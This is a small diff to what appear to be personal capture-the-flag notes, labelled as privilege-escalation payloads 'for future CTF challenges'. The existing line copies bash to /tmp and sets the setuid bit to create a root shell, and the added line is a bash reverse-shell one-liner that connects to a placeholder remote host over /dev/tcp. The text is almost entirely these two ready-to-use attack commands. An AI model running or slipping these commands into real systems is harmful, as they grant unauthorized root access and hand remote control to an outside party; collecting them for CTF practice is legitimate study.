@@ -34,4 +34,6 @@
 - Found an interesting payload for privilege escalation in future CTF challenges:
   ```bash
   cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
+  #another one
+  /bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1' 
   ```
